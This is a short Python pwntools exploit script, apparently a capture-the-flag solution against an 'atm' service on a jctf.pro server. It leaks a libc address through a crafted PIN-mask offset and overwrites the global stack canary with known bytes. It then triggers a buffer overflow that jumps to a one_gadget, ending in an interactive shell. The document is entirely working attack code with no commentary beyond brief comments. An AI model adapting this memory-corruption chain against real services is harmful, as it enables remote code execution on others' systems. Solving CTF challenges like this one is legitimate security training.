from pwn import *

#r = process("./atm", env={"LD_PRELOAD":"./libc.so.6"})
r = remote("atm.nc.jctf.pro", 1337)

def save(length, ip, has_pin = False, pin_position = None):
    r.sendlineafter("(3)\n", "1")
    r.sendlineafter("Length: ", str(length))
    r.recvuntil("data: \n")
    data = "ATM-REQ/1.0\n" + "atm-ip: " + ip + "\n"
    if has_pin:
        data += "mask-pin-at: " + str(pin_position)
    data = data.ljust(length, "B")
    r.send(data)
    
# Save a request with PIN index at leak address and a request without PIN
save(0x20000, '1.1.1.1', True, 0x25dd8 + 1)
save(0x20000, '2.2.2.2')
# Leak libc address
r.sendlineafter("(3)\n", "3")
r.recvuntil("PIN: ")
libc_base = 0x7f00000000b0 + (int(r.recv(8), 16) << 8) - 0x61b0
log.info("libc_base = " + hex(libc_base))
one_gadget = libc_base + 0x4f2c5
# Save a request to overwrite lower 4 bytes of global canary to ****
save(0x20000, '3.3.3.3', True, 0x65d98)
# Save a request to overwrite upper 4 bytes of global canary to ****, also setup a BOF in IP
save(0x20000, '0x9\0' + 'A'*52 + '*'*8 + 'A'*24 + p64(one_gadget), True, 0x86d9c)
# Send it, trigger BOF
r.sendlineafter("(3)\n", "2")

r.interactive()